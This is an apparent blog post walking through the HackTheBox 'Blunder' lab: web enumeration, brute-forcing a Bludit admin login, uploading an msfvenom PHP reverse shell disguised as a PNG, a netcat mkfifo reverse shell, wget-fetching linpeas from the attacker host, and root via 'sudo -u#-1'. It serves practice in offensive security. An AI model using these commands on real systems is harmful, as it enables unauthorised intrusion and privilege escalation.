<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HackTheBox - Blunder" /><meta property="og:locale" content="en_US" /><meta name="description" content="Welcome to my blog of CTF walkthroughs and anything else I post regarding cyber security." /><meta property="og:description" content="Welcome to my blog of CTF walkthroughs and anything else I post regarding cyber security." /><link rel="canonical" href="https://freddiphish.github.io/posts/HTB-Blunder/" /><meta property="og:url" content="https://freddiphish.github.io/posts/HTB-Blunder/" /><meta property="og:site_name" content="FreddiPhish" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-04T20:40:00+11:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Blunder" /><meta name="twitter:site" content="@FreddiPhish" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Welcome to my blog of CTF walkthroughs and anything else I post regarding cyber security.","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://freddiphish.github.io/posts/HTB-Blunder/"},"url":"https://freddiphish.github.io/posts/HTB-Blunder/","headline":"HackTheBox - Blunder","dateModified":"2020-11-04T20:40:00+11:00","datePublished":"2020-11-04T20:40:00+11:00","@context":"https://schema.org"}</script><title>HackTheBox - Blunder | FreddiPhish</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">FreddiPhish</a></div><div class="site-subtitle font-italic">Cybersecurity Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/FreddiPhish" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/FreddiPhish" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox - Blunder</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - Blunder</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Nov 4, 2020, 8:40 PM +1100" > Nov 4, 2020 <i class="unloaded">2020-11-04T20:40:00+11:00</i> </span> by <span class="author"> </span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/blunder/info-card.png" alt="Image of info card" /></p><h2 id="enumeration">Enumeration</h2><hr /><h3 id="initial-information">Initial Information</h3><p>Before starting we are shown this this is a linux box and that they rate it as an easy box.</p><h3 id="editing-hosts">Editing Hosts</h3><p>Lets add assign the ip address a domain name in our hosts file.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>sudo vim /etc/hosts
[ip] blunder.htb
</pre></table></code></div></div><h3 id="nmap-scan">Nmap Scan:</h3><p>Lets run <a href="https://nmap.org/">nmap</a> to find information on the machine’s ports and services.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo nmap -A -T4 -Pn -oA nmap-scan -p$(sudo nmap -p- --min-rate=1000 -T4 blunder.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) blunder.htb
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/blunder/nmap-scan.png" alt="Image of nmap scan" /></p><p>Nmap shows that there’s port 21 (ftp) and 80 (http) open.</p><h3 id="browsing">Browsing</h3><p>Starting with port 80 looks like there’s a lot of text to scan through.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb//blunder/homepage.png" alt="Image of home page" /></p><p>Looking through we can see:</p><ul><li>About hint: I created this site to dump my fact files, nothing more…….?<li>Powered by EgotisticalSW</ul><h3 id="gobuster">GoBuster</h3><p>We can use <a href="https://github.com/OJ/gobuster">gobuster</a> to discover web directories.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo gobuster dir -u http://blunder.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -s '200,204,301,302,307,403,500' -o gobuster.out -x php,txt -e
</pre></table></code></div></div><p>where:</p><ul><li><strong>-u</strong> is the target URL<li><strong>-w</strong> is the path to the wordlist<li><strong>-t</strong> is the number of concurrent threads (default 10)<li><strong>-s</strong> is positive status codes (will be overwritten with status-codes-blacklist if set) (default “200,204,301,302,307,401,403”)<li><strong>-o</strong> is the output file to write results to (defaults to stdout)<li><strong>-x</strong> is file extension(s) to search for<li><strong>-e</strong> is expanded mode, print full URLs</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/blunder/gobuster.png" alt="Image of gobuster scan" /></p><p>Looking at gogusters results, the <code class="language-plaintext highlighter-rouge">todo.txt</code> looks the most interesting.</p><p>Navigating to http://blunder.htb/todo.txt shows:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb//blunder/todo.png" alt="Image of todo text file" /></p><p>From the to do list, it looks like the CMS hasn’t been updated, and a user fergus might exist.</p><p>The other interesting find in gobuster is <code class="language-plaintext highlighter-rouge">/admin</code></p><p>Looking at http://blunder.htb/admin reveals a login page with the name bludit:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb//blunder/admin.png" alt="Image of admin page" /></p><p>Looking up bludit: https://www.bludit.com/ shows that it allows you to create your own website or blog</p><p>The admin page we found doesn’t reveal what version of bludit it is, however looking at the source code:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb//blunder/admin-source.png" alt="Image of admin source" /></p><p>Shows a number of references to version 3.9.2.</p><h2 id="exploitation">Exploitation</h2><hr /><p>A quick searchsploit for bludit shows some authentication bypass and directory traversal attacks, with two of them being for version 3.9.2, which is the version we suspect the machine is running.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb//blunder/searchsploit-bludit.png" alt="Image of searchsploit bludit" /></p><p>Looking at the <code class="language-plaintext highlighter-rouge">Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass</code> exploit, <code class="language-plaintext highlighter-rouge">48746.rb</code>, it seems that we need a username, which we can try fergus from the to do list. As for the password, i’ll be trying the old reliabile rockyou.txt.</p><p>We will need to install ther dependencies <code class="language-plaintext highlighter-rouge">httpclient</code> and <code class="language-plaintext highlighter-rouge">docopt</code> using <code class="language-plaintext highlighter-rouge">gem install httpclient docopt</code></p><p>I recieved an error saying <code class="language-plaintext highlighter-rouge">/usr/bin/env: ‘ruby\r’: No such file or directory</code> which I fixed by running <code class="language-plaintext highlighter-rouge">dos2unix 48746.rb</code></p><p>With the program working we can now run it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./48746.rb -r http://blunder.htb -u fergus -w /usr/share/wordlists/rockyou.txt
</pre></table></code></div></div><p>where:</p><ul><li><strong>-r</strong> is the url<li><strong>-u</strong> is the username<li><strong>-w</strong> is the path to a password wordlist</ul><p>Unfortunatly due to the slow speed at which each password is attempted and the large size of the rockyou wordlist, I eventually decided to stop the scan after a while as I doubted it would work.</p><p>Thinking back to the home page of the website, there’s a lot of text so perhaps the password is in there, so we can make a wordlist with cewl and try use that for our attack.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cewl http://blunder.htb/ -w site_wordlist.txt
</pre></table></code></div></div><p>Running it gives us a list of 349 words, which seems like a much more reasonable size wordlist for an exploit that runs at a slow speed. We can now run at attack again with the new wordlist.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./48746.rb -r http://blunder.htb -u fergus -w site_wordlist.txt
</pre></table></code></div></div><p>It successfully finds the password to be <code class="language-plaintext highlighter-rouge">RolandDeschain</code>, which is on line 176 of our wordlist and the script will stop the brute force attack.</p><p>So now we have the credentials for bludit, we can login to the /admin page wirth user: <code class="language-plaintext highlighter-rouge">fergus</code> and password <code class="language-plaintext highlighter-rouge">RolandDeschain</code>.</p><h3 id="bludit-enumeration">Bludit Enumeration</h3><p>Looking around the website things of interest are:</p><ul><li>The notification history on the dashboard<li>A draft called Blender under the content section<li>An authentication token under profile &gt; security<li>Lack of permisisons And it to view the categories and users page from the desktop<li>Able to create new content from the desktop</ul><h3 id="bludit-exploitation">Bludit Exploitation</h3><p>Now that we’ve looked over the website, let’s look back at the directory traversal</p><p>Looking back to the directory traversal exploits we found on searchsploit, we have the manual method and a Metasploit module. I’ll be trying the manual way.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>#### USAGE ####
# 1. Create payloads: .png with PHP payload and the .htaccess to treat .pngs like PHP
# 2. Change hardcoded values: URL is your target webapp, username and password is admin creds to get to the admin dir
# 3. Run the exploit
# 4. Start a listener to match your payload: `nc -nlvp 53`, meterpreter multi handler, etc
# 5. Visit your target web app and open the evil picture: visit url + /bl-content/tmp/temp/evil.png
</pre></table></code></div></div><p>Step 1. Change the variables for url, username and password</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>url = 'http://blunder.htb'  # CHANGE ME
username = 'fergus'  # CHANGE ME
password = 'RolandDeschain'  # CHANGE ME
</pre></table></code></div></div><p>Step 2. Modify the msfvenom command and generate the payload</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom -p php/reverse_php LHOST=10.10.14.52 LPORT=4444 -f raw -b '"' &gt; evil.png
</pre></table></code></div></div><p>Step 3. Add the msfvenom payload inside php code</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>echo -e "&lt;?php $(cat evil.png)" &gt; evil.png
</pre></table></code></div></div><p>Step 4. Create the .htaccess file</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>echo "RewriteEngine off" &gt; .htaccess
echo "AddType application/x-httpd-php .png" &gt;&gt; .htaccess
</pre></table></code></div></div><p>Step 5. Change the exploit extention from .txt to .py</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cp 48701.txt bludit.py
</pre></table></code></div></div><p>Step 6. Upload the payload using the script</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python bludit.py
</pre></table></code></div></div><p>Step 7. Start a nc listener</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc -nlvp 4444
</pre></table></code></div></div><p>Step 8. Execute the payload by opening the evil.png file in the browser</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://blunder.htb/bl-content/tmp/temp/evil.png
</pre></table></code></div></div><p>And we get a reverse shell as user www-data.</p><h2 id="lateral-movement">Lateral Movement</h2><hr /><p>Looking around we can see 2 users in the /home directory. User hugo and user shaun however only hugo has a user.txt file that only hugo has read access so looks like he will likely be the next target to pivot to.</p><p>I kept losing connection so I decided to run another netcat connection.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>kali: nc nlvp 4445

blunder: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.12 4445 &gt;/tmp/f
</pre></table></code></div></div><h3 id="linpeas">linPEAS</h3><p>We can run <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a> to do some more information gathering. Curl doesn’t seem to be installed to i’ll use wget to download linpeas and run it.</p><p>kali:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python -m SimpleHTTPServer 80
</pre></table></code></div></div><p>blunder:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>wget http://10.10.14.12/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
</pre></table></code></div></div><p>One interesting finding listed is: <code class="language-plaintext highlighter-rouge">/var/www/bludit-3.10.0a/bl-content/databases/users.php: "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d"</code> which we can look at more closely.</p><h3 id="bludit-stored-credentials">Bludit stored credentials</h3><p>Browsing files we find under /var/www 2 versions of bludit, the current version 3.9.2 and version 3.10.0a.</p><p>Looking in the folder for the current version of bludit, we can find some password hashes and salts for a user admin and fergus. In the new version, we find a field for admin with the name hugo, which matches the name of a user we want to try to pivot to, as well as the password that was found from linPEAS.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
</pre></table></code></div></div><p>Looks like we now have a hash for hugo’s password. With any luck we can find out what it is and that he has reused it for the system.</p><p>A quick google search reveals <a href="https://sha1.gromweb.com/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d">https://sha1.gromweb.com/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d</a> with the password being <code class="language-plaintext highlighter-rouge">Password120</code></p><p>We can now try switch to user hugo and see if Password120 works.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>su hugo
Password120
</pre></table></code></div></div><p>It works and we can now get the user.txt flag</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cat /home/hugo/user.txt
</pre></table></code></div></div><h2 id="privilege-escalation-to-root">Privilege Escalation (to root)</h2><hr /><p>Let’s first get a better shell</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python -c 'import pty;pty.spawn("/bin/bash")'
</pre></table></code></div></div><p>It can be worth running linPEAS again in case it’s able to gather more relevent information as the current user. Looking through the results, it appears that sudo is running version 1.8.25p1 which can be verified with <code class="language-plaintext highlighter-rouge">sudo -V</code></p><p>Lets view sudo permissions</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>sudo -l
User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
</pre></table></code></div></div><p>Looks like sudo is out of date Sudo version 1.8.25p1, let’s look up any exploits for sudo using <code class="language-plaintext highlighter-rouge">searchsploit sudo 1.8.</code></p><p>We see that theres a few different potential exploits. I’ll be looking at the .py first since they tend to be more friendly to run with no compiling.</p><p>The exploit can also be found online at exploitdb at <a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p><p>One thing I was a little confused was the version it mentions in the file, since it says:</p><ul><li>Version : Sudo &lt;1.2.28<li>Fix : The bug is fixed in sudo 1.8.28</ul><p>So since it wasn’t fixed till 1.8.28 then it should work.</p><p>Looking at it closely we also see that the root permissions regarding bash matches our situation.</p><p>The description for the exploit reads:</p><blockquote><p>Sudo doesn’t check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv -u#-1 returns as 0 which is root’s id</p></blockquote><p>We don’t really need to run the python script, we can just use the one line exploit:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo -u#-1 /bin/bash
</pre></table></code></div></div><p>And success we successfully get root!</p><p>Now we just need to get the root flag.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cat /root/root.txt
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - Blunder - FreddiPhish&url=https://freddiphish.github.io/posts/HTB-Blunder/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Blunder - FreddiPhish&u=https://freddiphish.github.io/posts/HTB-Blunder/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox - Blunder - FreddiPhish&url=https://freddiphish.github.io/posts/HTB-Blunder/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Omni/">HackTheBox - Omni</a><li><a href="/posts/HTB-Buff/">HackTheBox - Buff</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/openbsd/">openbsd</a> <a class="post-tag" href="/tags/port-fowarding/">port fowarding</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/windows-iot/">windows iot</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Tabby/"><div class="card-body"> <span class="timeago small" > Nov 8, 2020 <i class="unloaded">2020-11-08T23:30:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Tabby</h3><div class="text-muted small"><p> Enumeration Initial Information Before starting we are shown this this is a linux box and that they rate it as an easy box. Editing Hosts Lets add assign the ip address a domain name in our h...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Buff/"><div class="card-body"> <span class="timeago small" > Nov 22, 2020 <i class="unloaded">2020-11-22T12:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Buff</h3><div 